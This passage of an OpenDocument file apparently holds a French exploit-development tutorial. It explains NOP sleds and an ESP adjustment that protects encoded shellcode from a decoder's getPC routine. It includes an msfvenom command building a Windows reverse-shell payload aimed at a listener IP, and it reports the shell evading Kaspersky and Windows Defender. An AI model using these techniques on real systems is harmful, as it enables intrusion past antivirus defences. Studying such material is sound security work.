      <text:p text:style-name="P11"/>
      <text:p text:style-name="P13"><text:span text:style-name="T1">REMARQUE : en réalité, </text:span><text:span text:style-name="T3">\x90</text:span><text:span text:style-name="T1"> correspond à l'instruction "XCHG EAX,EAX", ce qui remplace la valeur contenue dans EAX par la valeur contenue dans EAX... Ce qui ne fait donc rien.</text:span></text:p>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P13"><text:span text:style-name="T1">En ajoutant une NOP Sled avant notre shellcode encodé, le flux d'exécution va se reporter sur l'adresse mémoire de la stack juste après notre adresse écrasant le Saved Return Pointer, sur laquelle pointe ESP. On va ensuite trouver tout un tas de NOP's, qu'on va descendre jusqu'à atteindre notre shellcode. Le decoder stub va enclencher sa routine </text:span><text:span text:style-name="T3">getPC</text:span><text:span text:style-name="T1">, mais ESP se trouvera alors assez loin du shellcode pour que ce dernier ne soit pas endommagé ; tout au plus supprimera-t-on quelques NOPs, ce qui n'est pas important.</text:span></text:p>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P13"><text:span text:style-name="T1">En général, ce qu'on va faire c'est qu'on va essayer de mettre de plus en plus de NOPs jusqu'à ce que notre exploit fonctionne (en général, pour protéger le shellcode contre la routine </text:span><text:span text:style-name="T3">getPC</text:span><text:span text:style-name="T1">, 12 NOPs sont suffisants).</text:span></text:p>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P11">Cette solution n'est pas vraiment satisfaisante, car cela prend beaucoup d'espace dans la stack qu'on pourrait avoir utilisé pour du shellcode. En plus de montrer qu'on ne sait pas vraiment ce qu'on fait, <text:soft-page-break/>et qu'on jette des choses au programme jusqu'à ce que ça fonctionne.</text:p>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P11"/>
      <text:list xml:id="list5704788026077151214" text:style-name="L20">
        <text:list-item>
          <text:p text:style-name="P34">The right way</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P13"><text:span text:style-name="T1">La bonne façon de mitiger la routine </text:span><text:span text:style-name="T3">getPC</text:span><text:span text:style-name="T17"> est plutôt la suivante. Le problème est que </text:span><text:span text:style-name="T3">getPC</text:span><text:span text:style-name="T17"> fait </text:span><text:span text:style-name="T17">un trou autour de ESP. Mais on a la possibilité d'exécuter du code, donc pourquoi ne pas faire commencer notre shellcode par une série d'instructions qui va faire "remonter" ESP de quelques bytes, et l'éloignant assez de notre shellcode pour que, lorsque EIP atteint notre decoder stub, ESP soit trop loin du shellcode pour y faire de quelconques dégâts ?</text:span></text:p>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P11"><draw:frame draw:style-name="fr4" draw:name="images48" text:anchor-type="paragraph" svg:width="16.999cm" svg:height="9.001cm" draw:z-index="47"><draw:image xlink:href="Pictures/2000000700004D1B000028D494AD492D.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P11">Ici, en "remontant" ESP de 16 (0x10 en hexa), on s'assure que les dégâts occasionnés par le decoder stub soient faits dans un espace mémoire qui ne nous importe pas. Et l'instruction SUB ESP,0x10 est bien moins volumineuse qu'une grosse NOP Sled.</text:p>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P13"><text:span text:style-name="T17">Voyons comment traduire notre instruction SUB ESP,0x10 en langage machine pour pouvoir l'ajouter juste avant notre shellcode. Pour cela on va utiliser l'assembleur Metasploit </text:span><text:span text:style-name="T3">metasm_shell.rb</text:span><text:span text:style-name="T17">, qui pop une interactive shell, avant de traduire toutes les instructions assembleur qu'on lui fournira en langage machine.</text:span></text:p>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P5">/usr/share/metasploit-framework/tools/exploit/metasm_shell.rb</text:p>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P11"><draw:frame draw:style-name="fr4" draw:name="images49" text:anchor-type="paragraph" svg:width="16.999cm" svg:height="3.166cm" draw:z-index="48"><draw:image xlink:href="Pictures/20000007000044D600000CD2D802309B.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P11">Ajouter ces trois bytes devant notre shellcode devrait faire l'affaire, et permettre de faire remonter ESP suffisamment. On arrive ici à le faire de manière élégante en 3 bytes, au lieu d'une énorme NOP Sled qui prendrait bien plus de place.</text:p>
      <text:p text:style-name="P11"><text:soft-page-break/></text:p>
      <text:p text:style-name="P11">REMARQUE / ATTENTION :</text:p>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P11"><draw:frame draw:style-name="fr2" draw:name="images50" text:anchor-type="paragraph" svg:width="14.631cm" svg:height="4.209cm" draw:z-index="49"><draw:image xlink:href="Pictures/200000070000392800001070320B4261.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P11">Notre exploit final est le suivant :</text:p>
      <text:p text:style-name="P11"><draw:frame draw:style-name="fr2" draw:name="images51" text:anchor-type="paragraph" svg:width="10.321cm" svg:height="18.944cm" draw:z-index="50"><draw:image xlink:href="Pictures/2000000700002DE50000543D5737F5AF.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P11"><text:soft-page-break/>REMARQUE : attention, parfois une instruction du payload peut être considéré par Immunity comme appartenant à une instruction précédente (comme le premier \xCC ci-dessus). Dans ce cas, il faudra ajuster avec des instructions aléatoires, pour "compléter" l'instruction précédente avant notre véritable payload.</text:p>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P11">Anyway, <text:span text:style-name="T9">WE POPPED CALC !!</text:span></text:p>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P13">POPPING A SHELL ?</text:p>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P11">Essayons d'abord simplement de générer en shellcode le payload "<text:span text:style-name="T5">windows/shell_reverse_tcp</text:span>", au lieu de "<text:span text:style-name="T5">windows/exec</text:span>" :</text:p>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P5">msfvenom -p windows/shell_reverse_tcp -f python -b "\x00\x0A" --var-name shellcode_rev EXITFUNC=thread LHOST=192.168.1.5 LPORT=1234</text:p>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P11">Comme avec notre payload calc.exe, il y a eu un encodage d'une itération shikata_ga_nai, donc on laisse le shellcode permettant de faire remonter ESP.</text:p>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P11">Simplement remplacer le shellcode de calc.exe par le shellcode de shell_reverse_tcp a fonctionné, même à travers Kaspersky et Windows Defender, on catch notre shell par le biais de notre netcat listener !</text:p>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P12">HELL YEAH GOT SH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MRoman10-Regular-Identity-H" svg:font-family="LMRoman10-Regular-Identity-H"/>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38M24S</meta:editing-duration>
    <meta:editing-cycles>21</meta:editing-cycles>
    <meta:generator>OpenOffice/4.1.5$Win32 OpenOffice.org_project/415m1$Build-9789</meta:generator>
    <dc:date>2021-01-10T20:19:36.45</dc:date>
    <meta:document-statistic meta:table-count="0" meta:image-count="51" meta:object-count="0" meta:page-count="30" meta:paragraph-count="258" meta:word-count="6954" meta:character-count="42542"/>
    <meta:user-defined meta:name="Info 1"/>
    <meta:user-defined meta:name="Info 2"/>
    <meta:user-defined meta:name="Info 3"/>
    <meta:user-defined meta:name="Info 4"/>
  </office:meta>
</office:document-meta>
</file>